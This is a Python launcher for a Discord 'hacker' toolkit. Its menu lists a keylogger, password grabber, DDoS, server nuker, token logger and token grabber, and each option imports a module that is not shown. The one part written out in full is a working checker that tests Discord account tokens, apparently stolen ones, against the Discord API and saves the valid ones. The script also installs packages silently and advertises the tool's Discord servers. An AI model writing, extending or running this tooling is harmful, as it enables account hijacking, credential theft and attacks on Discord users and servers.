import os
os.system("python.exe -m pip install --upgrade pip")
from os import system
from os import startfile
import random
import threading
import time
import pathlib
from random import randint
try:
    import requests
    from requests import get, post
except:
    os.system("pip install requests")
    import requests
    from requests import get, post
try:
    import json
except:
    os.system('pip install json')
    import json
try:
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    import colorama
    from colorama import Fore
try:
    import discord
    from discord.ext import commands
except:
    os.system("pip install discord.py==1.7.3")
    import discord
    from discord.ext import commands
try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver import ActionChains
except:
    os.system('pip install selenium')
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver import ActionChains
clear = lambda: os.system('cls')
clear()
title = 'All In One (Free)'
system(f'title {title}')
print(f"         ■■■        ■            ■                ■   ■       ■        ■■■■■■■■    ■       ■  ■■■■■■■■")
print(f"        ■   ■       ■            ■                    ■ ■     ■       ■        ■   ■ ■     ■  ■       ")
print(f"       ■     ■      ■            ■                ■   ■  ■    ■      ■          ■  ■  ■    ■  ■       ")
print(f"      ■ ■■■■■ ■     ■            ■                ■   ■   ■   ■      ■          ■  ■   ■   ■  ■■■■■■■■")
print(f"     ■         ■    ■            ■                ■   ■    ■  ■      ■          ■  ■    ■  ■  ■       ")
print(f"    ■           ■   ■            ■                ■   ■     ■ ■       ■        ■   ■     ■ ■  ■      ")
print(f"   ■             ■  ■■■■■■■■■■■■  ■■■■■■■■■■■     ■   ■       ■        ■■■■■■■■    ■       ■  ■■■■■■■■")
print(f"                              Made By All In One - Discord Program Tools                                          ")
print(f"                                discord.gg/AIO | discord.gg/c2g3G9BHMx")
print(f"                  ╔══════════════════╦═══════════════════════╦══════════════════════╗")
print(f"                  ║  Hacker Manager  ║     Discord Tools     ║        Others        ║            ")
print(f"                  ║══════════════════║═══════════════════════║══════════════════════║")
print(f"                  ║[1] Key Logger    ║[9] Server Nuker       ║[17]                  ║")
print(f"                  ║[2] Password Grab ║[10] Token Checker     ║[18]                  ║")
print(f"                  ║[3]Email Generator║[11] Token Logger      ║[19]                  ║")
print(f"                  ║[4] DDOS          ║[12] Token Grabber     ║[20]                  ║")
print(f"                  ║[5]               ║[13] Self Bot          ║[21]                  ║")
print(f"                  ║[6]               ║[14]                   ║[22]                  ║")
print(f"                  ║[7]               ║[15]                   ║[23] About            ║")
print(f"                  ║[8]               ║[16]                   ║[24] Exit             ║")
print(f"                  ╚══════════════════╩═══════════════════════╩══════════════════════╝")
choice = input(f"[?]> ")
clear()
if choice == '2':
    import Password_Grab


elif choice == '4':
    import DDOS_Tools

elif choice == '13':
    import self_bot

elif choice == '1':
    import Key_Logger

elif  choice == '12':
    import token_grad

elif  choice == '9':
    import RAID

elif choice == '23':
    clear()
    input(f'''Hi I'm ■■■■■■ the creator of this tool I'm a french guy if you're wondering why this tool is not written in french the reason is that english language is the most spoken language in the world if you're logical but the real reason is that I found it stylish to make a tool entirely in english if you're realized :/ anyway if you want to have access to all the other tools join https://discord.gg/6Pu7MUcFrQ ^^''')

elif choice == '24':
    clear()
    os._exit(0)

elif choice == '3':
    import Email_Generator

elif choice == '11':
        import discord_token_logger

elif choice == '10':
    title = f'Token Checker'
    system(f'title {title}')
    input(f'\nPress Enter if you are sure you put all the tokens you wanted to check in the token.txt file{Fore.RESET}...')

    def variant2(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
        if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
            return False
        else:
            return True
    def variant2_Status(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
        if response.status_code == 401:
            return 'Invalid'
        elif "You need to verify your account in order to perform this action." in str(response.content):
            return 'Phone Lock'
        else:
            return 'Valid'

    if __name__ == "__main__":
        try:
            checked = []
            with open('tokens.txt', 'r') as tokens:
                for token in tokens.read().split('\n'):
                    if len(token) > 15 and token not in checked and variant2(token) == True:
                        print(f'[+] {token} Valid')

                        checked.append(token)
                    else:
                        print(f'[-] {token} Invalid')
                        if len(checked) > 0:
                            save = input(f'{len(checked)} valid tokens Save to File (y/n) : ').lower()
                            if save == 'y':
                                name = randint(100000000, 9999999999)
                                with open(f'{name}.txt', 'w') as saveFile:
                                    saveFile.write('\n'.join(checked))
                                    print(f'Valid tokens Save To {name}.txt File!')
                                    input('Press Enter For restart the program...')
        except:
            input('Can`t Open "tokens.txt" File!')
else:
    input(f"\n'{choice}' Is not a possible request please try again...")